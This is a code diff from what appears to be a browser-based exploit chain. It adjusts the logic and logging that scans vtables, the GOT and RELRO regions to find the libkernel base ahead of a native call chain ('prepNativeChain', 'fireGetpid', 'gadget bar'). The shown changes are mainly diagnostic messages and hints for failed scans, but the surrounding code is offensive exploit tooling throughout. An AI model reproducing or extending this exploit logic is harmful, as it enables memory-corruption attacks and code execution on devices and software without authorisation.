@@ -51,7 +51,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831c";
+const BUILD_ID = "rw-20250831d";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -1979,19 +1979,26 @@ function finishFindLkChunk(chunk) {
         crashLog.flushSync();
         return true;
     }
-    if (chunk.done && !chunk.ok) {
+    if (chunk.done && chunk.phase === "got-scan-miss") {
         findLkState = null;
         findLkAuto = false;
         findLkStop = false;
+        mark("LK-GOT-TRACE", "cells=" + (chunk.cells != null ? chunk.cells : "?")
+            + " vtables=" + (chunk.vtCount != null ? chunk.vtCount : "?")
+            + " vtExt=" + (chunk.vtExt != null ? chunk.vtExt : (chunk.extList ? chunk.extList.length : 0))
+            + " nearPages=" + (chunk.nearPages != null ? chunk.nearPages : "?")
+            + " belowPages=" + (chunk.belowPages != null ? chunk.belowPages : "?")
+            + (chunk.vtable ? " vt=" + chunk.vtable : " vt=none"));
         mark("LK-GOT-MISS", (chunk.error || chunk.phase || "miss")
-            + (chunk.vtable ? " vt=" + chunk.vtable : "")
             + (chunk.extList && chunk.extList.length
                 ? " ext=" + chunk.extList.map(function (e) { return e.ptr; }).join(",") : "")
-            + (chunk.pages != null ? " nearPages=" + chunk.pages : "")
-            + (chunk.tried != null ? " tried=" + chunk.tried : "")
             + " build=" + BUILD_ID);
-        mark("LK-HINT", "miss — Scan GOT norm or Scan libkernel (full) from gadget bar");
-        state("Scan GOT miss — Verify lk or Scan libkernel", "bad");
+        mark("LK-HINT", chunk.cells === 0
+            ? "no textarea cell — re-run Start"
+            : (chunk.vtCount === 0
+                ? "no vtable chain — try cal index for CELL-SCAN lines"
+                : "ext ptrs found but no lk base — paste ext to hex + Verify lk"));
+        state("Scan GOT miss — see LK-GOT-TRACE", "bad");
         crashLog.flushSync();
         return true;
     }
@@ -2042,10 +2049,15 @@ async function runFindLkAuto(preset) {
             if (chunk.phase === "got-scan-start")
                 mark("LK-GOT", "phase vt→abs→nearlk→below→hdr (poops-safe)");
             else if (chunk.phase === "vt-ready")
-                mark("LK-GOT", "vtable " + chunk.vtable);
+                mark("LK-GOT", "vtable " + chunk.vtable
+                    + " n=" + (chunk.vtCount || 1) + " cells=" + (chunk.cells || "?")
+                    + " " + (chunk.label || ""));
             else if (chunk.phase === "vt-done")
-                mark("LK-GOT", "vtable ext=" + (chunk.ext || 0)
-                    + " — abs RELRO scan around vtable");
+                mark("LK-GOT", "vtable done ext=" + (chunk.ext || 0)
+                    + " cells=" + (chunk.cells != null ? chunk.cells : "?")
+                    + " n=" + (chunk.vtCount != null ? chunk.vtCount : "?")
+                    + (chunk.error ? " err=" + chunk.error : "")
+                    + " — abs RELRO");
             else if (chunk.phase === "abs-start")
                 mark("LK-GOT", "abs RELRO " + chunk.from + "…" + chunk.to);
             else if (chunk.phase === "abs-done")
